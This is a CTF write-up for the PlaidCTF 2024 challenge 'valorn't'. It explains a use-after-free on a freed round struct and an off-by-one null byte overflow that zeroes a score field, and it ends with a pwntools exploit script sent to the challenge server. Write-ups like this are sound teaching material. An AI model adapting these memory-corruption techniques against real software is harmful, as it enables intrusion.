+++
title = "valorn't - PlaidCTF 2024"
date = 2024-04-23T20:00:41+02:00
draft = false
+++

I solved the easy pwn chall "valorn't" during PlaidCTF while playing with Friendly Maltese Citizens.

as usual, the goal was to win the game and read the flag
#
```c
    int ret = play_pew_pew_game();

	if (ret == 0) {
		read_flage();
	}
```
#
in order to win, `is_cheater` had to be set and the enemy team win-counter has to be `0`
```c
int play_pew_pew_game() {
	// ...
	
	if (is_cheater) {
		if (res->enemy_team == 0) {
			return 0;
		}
		else {
			puts("Dang, you're dogwater. Go back to the range");
			return 1;
		}
	}
	else {
		puts("Not good enough. Should be able to take out cheaters as well\n");
	}
	
	return 1;
}
```
first of all about the `is_cheater` variable:
in `play_rounds` you can set the `cheater_detected` variable corresponding to each `round_node_t` to `1` when entering a bad word in the post-round message.
however this is instantly undone in the if-branch after. this would normally result in `cheater_checker()`, which checks the `cheater_detected` property
for each round, to return `false`, so we'd loose. in our case, that isn't a problem though, since the if-branch introduces a use-after-free for `round_node_t`:
```c
if (rounds[curr_round]->cheater_detected == 1) {
	// ...
	rounds[curr_round]->cheater_detected = 0;
	free(rounds[curr_round]);
	printf("Would you like to report this to the devs? ");
	// ...
	scanf(" %c", &choice);
	// ...
	if (choice == 'y') {
		char *msg = malloc(0x70);
		get_message(msg, 0x70);
		// ...
	}
}
```
as you can see `rounds[curr_round]` isn't zeroed out and still used in `cheater_checker()`. we also immedeatly get to overwrite the `round_node_t` struct
affected by the uaf, which let's us set the `cheater_detected` successfully again. this is how we set `is_cheater` in `play_pew_pew_game()`.

to get the flag, the next constraint is `res->enemy_team == 0`.
however you automatically loose every second round, so you can't prevent the enemy win-counter to be set:
```c
if (curr_round % 2 == 0) {
	score->our_team += 1;
	printf("Congrats on the round win!!\n");
} else {
	score->enemy_team += 1;
	printf("Aww, you lost. You'll get em next time\n");
}
```
luckily there is also a vulnerabilitiy to let us bybass the check. after the game we're asked about some feedback. our input is read into the `msg` property of
the `game_t` structure. now the next vuln lies in `filter_message()`. if we place a bad word at the end of `msg`, plus our last weapon choice being `3`,
we have a null byte overflow:
```c
if (gun_choice == 3 && strstr(msg, "heck") != NULL) {
	printf("Swear detected! Filtering out\n");
	int idx = strstr(msg, "heck") - msg;
	int after_len = strlen(msg) + 1 - idx;
	char *before = malloc(idx + 1);
	char *after = malloc(after_len);
	strncpy(after, msg+idx+4, after_len);
	strncpy(msg + idx, "*****", 5);
	strncpy(msg+idx+5, after, after_len);
	msg[idx+5+after_len] = '\0';

	free(before);
	free(after);
	return 2;	
}
```
this tries to remove the bad word and replace it with asterisks, however also appends a null byte at the end, which goes out-of-bounds by 1 byte.
we're lucky that `game_t` has the following structure:
```c
typedef struct game_t {
	char msg[0x64];
	int enemy_team;
	int our_team;
	int last_used_weapon;
} game;
```
this means our off-by-one null byte overflow can zero out the enemy team and help us pass the check.
in combination with the uaf we can successfully win the game and get the flag. the exploit is pretty simple:
```python
from pwn import *

#p = process("./valor-not")
p = remote("valornt.chal.pwni.ng",1337)

for i in range(7):
    p.sendlineafter("Choose your weapon:","3")
    p.sendline("")
    p.sendline("y")
    p.sendline("cheater")
    p.sendline("y")
    p.sendline(b"A"*0x64+p32(0x1))

p.sendline("y")
p.sendline("A"*0x5f + "heck")

p.interactive()
```
